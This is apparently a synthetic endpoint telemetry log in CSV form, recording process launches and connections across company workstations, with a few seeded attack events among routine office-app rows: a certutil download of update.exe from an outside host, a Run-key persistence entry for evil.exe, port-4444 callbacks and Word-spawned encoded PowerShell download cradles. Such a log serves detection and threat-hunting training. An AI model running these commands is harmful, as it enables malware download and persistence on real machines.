timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
2026-04-01 17:19:00,eng-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",192.168.1.12,445,none
2026-04-01 17:20:00,fin-ws-01,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
2026-04-01 17:21:00,shared-jump-01,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
2026-04-01 17:22:00,sales-lt-01,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,151.101.1.69,443,slack-client
2026-04-01 17:23:00,fin-ws-01,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
2026-04-01 17:24:00,fin-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",23.45.67.89,443,outlook
2026-04-01 17:25:00,sales-lt-01,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-01 17:26:00,eng-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.1.5.12,445,none
2026-04-01 17:26:00,fin-ws-02,farah,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-01 17:27:00,shared-jump-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
2026-04-01 17:27:00,fin-ws-02,farah,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-01 17:28:00,sales-lt-02,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-01 17:29:00,eng-ws-02,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
2026-04-01 17:30:00,fin-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-01 17:31:00,fin-ws-02,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",10.1.5.12,445,none
2026-04-01 17:32:00,ops-ws-01,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
2026-04-01 17:33:00,hr-ws-01,farah,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-01 17:34:00,eng-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
2026-04-01 17:35:00,fin-ws-01,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",192.168.10.9,0,none
2026-04-01 17:36:00,hr-ws-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.1.5.12,0,none
2026-04-01 17:37:00,ops-ws-01,julia,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-01 17:38:00,fin-ws-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-01 17:39:00,shared-jump-01,farah,explorer.exe,explorer.exe,explorer.exe /background,192.168.10.9,0,none
2026-04-01 17:40:00,sales-lt-01,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.2.20,445,none
2026-04-01 17:41:00,fin-ws-02,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",10.0.0.10,445,none
2026-04-01 17:42:00,sales-lt-02,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
2026-04-01 17:43:00,eng-ws-02,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-01 17:44:00,sales-lt-02,diana,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
2026-04-01 17:45:00,fin-ws-01,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",185.199.108.153,443,outlook
2026-04-01 17:46:00,sales-lt-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.0.2.20,0,none
2026-04-01 17:47:00,shared-jump-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
2026-04-01 17:48:00,eng-ws-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
2026-04-01 17:49:00,sales-lt-01,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
2026-04-01 17:50:00,hr-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,10.1.5.12,0,none
2026-04-01 17:51:00,eng-ws-01,diana,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
2026-04-01 17:52:00,eng-ws-01,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",1.1.1.1,443,outlook
2026-04-01 17:53:00,sales-lt-02,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
2026-04-01 17:54:00,hr-ws-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-01 17:55:00,ops-ws-02,farah,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-01 17:56:00,ops-ws-02,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-01 17:57:00,ops-ws-01,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
2026-04-01 17:58:00,sales-lt-02,charlie,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-01 17:59:00,eng-ws-01,alice,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-01 18:00:00,sales-lt-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
2026-04-01 18:01:00,fin-ws-02,diana,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
2026-04-01 18:02:00,fin-ws-01,ethan,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-01 18:03:00,eng-ws-01,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
2026-04-01 18:04:00,fin-ws-02,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,firefox
2026-04-01 18:05:00,eng-ws-01,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
2026-04-01 18:06:00,fin-ws-02,alice,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-01 18:07:00,fin-ws-02,irfan,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
2026-04-01 18:08:00,fin-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
2026-04-01 18:09:00,shared-jump-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,104.18.20.12,443,zoom-client
2026-04-01 18:10:00,fin-ws-02,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-01 18:11:00,ops-ws-02,ethan,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-01 18:12:00,sales-lt-02,julia,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-01 18:13:00,ops-ws-02,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
2026-04-01 18:14:00,ops-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",192.168.10.9,445,none
2026-04-01 18:15:00,ops-ws-01,george,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 18:16:00,hr-ws-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
2026-04-01 18:17:00,fin-ws-02,diana,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-01 18:17:00,fin-ws-01,alice,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-01 18:18:00,sales-lt-01,alice,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
2026-04-01 18:18:00,fin-ws-01,alice,evil.exe,explorer.exe,C:\Users\alice\AppData\Local\Temp\evil.exe,192.168.10.9,0,none
2026-04-01 18:19:00,ops-ws-02,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
2026-04-01 18:19:00,fin-ws-01,alice,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,192.168.1.12,0,none
2026-04-01 18:20:00,ops-ws-02,diana,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
2026-04-01 18:21:00,ops-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
2026-04-01 18:22:00,eng-ws-02,irfan,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-01 18:23:00,eng-ws-01,ethan,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.5,0,none
2026-04-01 18:24:00,eng-ws-02,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",192.168.10.9,445,none
2026-04-01 18:25:00,fin-ws-02,helen,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-01 18:26:00,hr-ws-01,alice,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-01 18:27:00,eng-ws-02,helen,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-01 18:28:00,ops-ws-02,diana,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
2026-04-01 18:29:00,hr-ws-01,george,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
2026-04-01 18:30:00,ops-ws-01,ethan,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-01 18:31:00,sales-lt-02,helen,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 18:32:00,sales-lt-01,farah,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-01 18:33:00,ops-ws-01,george,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-01 18:34:00,fin-ws-01,alice,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-01 18:35:00,shared-jump-01,julia,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
2026-04-01 18:36:00,hr-ws-01,charlie,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-01 18:37:00,fin-ws-02,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 18:38:00,sales-lt-01,irfan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\irfan\Documents\notes.txt""",172.16.4.25,0,none
2026-04-01 18:39:00,hr-ws-01,helen,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-01 18:40:00,sales-lt-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-01 18:41:00,fin-ws-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-01 18:42:00,sales-lt-01,charlie,slack.exe,explorer.exe,slack.exe --processStart slack.exe,8.8.8.8,443,slack-client
2026-04-01 18:43:00,sales-lt-02,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-01 18:44:00,ops-ws-02,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",10.0.2.20,0,none
2026-04-01 18:45:00,eng-ws-02,charlie,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-01 18:46:00,sales-lt-01,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-01 18:47:00,sales-lt-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-01 18:48:00,ops-ws-02,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-01 18:49:00,hr-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-01 18:50:00,sales-lt-02,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",10.0.1.15,445,none
2026-04-01 18:51:00,eng-ws-02,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
2026-04-01 18:52:00,fin-ws-02,diana,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
2026-04-01 18:53:00,hr-ws-01,farah,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-01 18:54:00,eng-ws-02,farah,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-01 18:55:00,shared-jump-01,diana,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-01 18:55:00,sales-lt-01,farah,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-01 18:56:00,hr-ws-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.0.0.5,0,none
2026-04-01 18:56:00,sales-lt-01,farah,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-01 18:57:00,eng-ws-02,george,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
2026-04-01 18:58:00,sales-lt-02,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-01 18:59:00,fin-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,142.250.183.14,443,teams-client
2026-04-01 19:00:00,ops-ws-01,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-01 19:01:00,fin-ws-02,diana,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-01 19:02:00,hr-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
2026-04-01 19:03:00,shared-jump-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-01 19:04:00,fin-ws-02,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-01 19:05:00,hr-ws-01,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 19:06:00,shared-jump-01,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",192.168.10.9,0,none
2026-04-01 19:07:00,ops-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",10.0.1.15,445,none
2026-04-01 19:08:00,eng-ws-02,irfan,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-01 19:09:00,eng-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,10.0.2.20,0,none
2026-04-01 19:10:00,eng-ws-02,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
2026-04-01 19:11:00,ops-ws-01,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",10.1.5.12,0,none
2026-04-01 19:12:00,sales-lt-01,helen,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-01 19:13:00,sales-lt-02,george,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 19:14:00,shared-jump-01,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-01 19:15:00,eng-ws-02,bob,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-01 19:16:00,ops-ws-02,charlie,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
2026-04-01 19:17:00,ops-ws-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-01 19:18:00,hr-ws-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",52.95.110.1,443,outlook
2026-04-01 19:19:00,eng-ws-02,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
2026-04-01 19:20:00,sales-lt-01,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
2026-04-01 19:21:00,ops-ws-02,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
2026-04-01 19:22:00,sales-lt-02,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,104.18.20.12,443,zoom-client
2026-04-01 19:23:00,ops-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-01 19:24:00,ops-ws-02,bob,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-01 19:25:00,fin-ws-02,julia,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
2026-04-01 19:26:00,ops-ws-02,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
2026-04-01 19:27:00,hr-ws-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-01 19:28:00,ops-ws-02,ethan,explorer.exe,explorer.exe,explorer.exe /background,10.1.5.12,0,none
2026-04-01 19:29:00,sales-lt-01,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",52.95.110.1,443,outlook
2026-04-01 19:30:00,fin-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 19:31:00,sales-lt-01,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-01 19:32:00,ops-ws-02,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
2026-04-01 19:33:00,ops-ws-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",142.250.183.14,443,outlook
2026-04-01 19:34:00,shared-jump-01,charlie,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-01 19:35:00,shared-jump-01,diana,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
2026-04-01 19:35:00,eng-ws-01,bob,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-01 19:36:00,fin-ws-01,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",52.95.110.1,443,outlook
2026-04-01 19:36:00,eng-ws-01,bob,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
2026-04-01 19:37:00,sales-lt-01,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",10.0.2.20,445,none
2026-04-01 19:37:00,eng-ws-01,bob,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-01 19:38:00,ops-ws-01,george,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-01 19:39:00,ops-ws-01,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 19:40:00,shared-jump-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-01 19:41:00,sales-lt-01,diana,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
2026-04-01 19:42:00,eng-ws-02,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",192.168.1.12,0,none
2026-04-01 19:43:00,fin-ws-01,ethan,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-01 19:44:00,fin-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",172.16.10.8,445,none
2026-04-01 19:45:00,eng-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,151.101.1.69,443,zoom-client
2026-04-01 19:46:00,shared-jump-01,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
2026-04-01 19:47:00,ops-ws-02,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-01 19:48:00,sales-lt-02,julia,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\julia\Documents\notes.txt""",10.0.0.10,0,none
2026-04-01 19:49:00,eng-ws-02,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",172.16.4.25,0,none
2026-04-01 19:50:00,fin-ws-01,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
2026-04-01 19:51:00,ops-ws-02,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
2026-04-01 19:52:00,fin-ws-02,irfan,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-01 19:53:00,sales-lt-02,julia,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-01 19:54:00,sales-lt-01,farah,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-01 19:55:00,shared-jump-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-01 19:56:00,sales-lt-01,bob,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-01 19:57:00,eng-ws-02,bob,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-01 19:58:00,ops-ws-01,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",151.101.1.69,443,outlook
2026-04-01 19:59:00,fin-ws-02,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
2026-04-01 20:00:00,sales-lt-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
2026-04-01 20:01:00,ops-ws-01,bob,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-01 20:02:00,eng-ws-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",1.1.1.1,443,outlook
2026-04-01 20:03:00,fin-ws-01,diana,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
2026-04-01 20:04:00,sales-lt-02,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",185.199.108.153,443,outlook
2026-04-01 20:05:00,ops-ws-02,helen,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-01 20:06:00,fin-ws-01,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",172.16.10.8,0,none
2026-04-01 20:07:00,ops-ws-02,alice,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-01 20:08:00,sales-lt-01,julia,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
2026-04-01 20:09:00,eng-ws-01,diana,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-01 20:10:00,eng-ws-02,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-01 20:11:00,ops-ws-01,farah,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
2026-04-01 20:12:00,eng-ws-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",192.168.1.12,0,none
2026-04-01 20:13:00,sales-lt-02,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
2026-04-01 20:14:00,shared-jump-01,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
2026-04-01 20:15:00,ops-ws-01,farah,teams.exe,explorer.exe,teams.exe --type=renderer,23.45.67.89,443,teams-client
2026-04-01 20:16:00,hr-ws-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
2026-04-01 20:17:00,fin-ws-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
2026-04-01 20:18:00,eng-ws-02,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",23.45.67.89,443,outlook
2026-04-01 20:19:00,sales-lt-02,george,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 20:20:00,shared-jump-01,george,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 20:21:00,sales-lt-01,irfan,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-01 20:22:00,sales-lt-02,charlie,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
2026-04-01 20:23:00,fin-ws-01,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",151.101.1.69,443,outlook
2026-04-01 20:24:00,shared-jump-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",8.8.8.8,443,outlook
2026-04-01 20:25:00,sales-lt-01,charlie,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-01 20:26:00,sales-lt-02,irfan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\irfan\Documents\notes.txt""",192.168.1.12,0,none
2026-04-01 20:27:00,ops-ws-02,helen,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-01 20:28:00,sales-lt-01,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
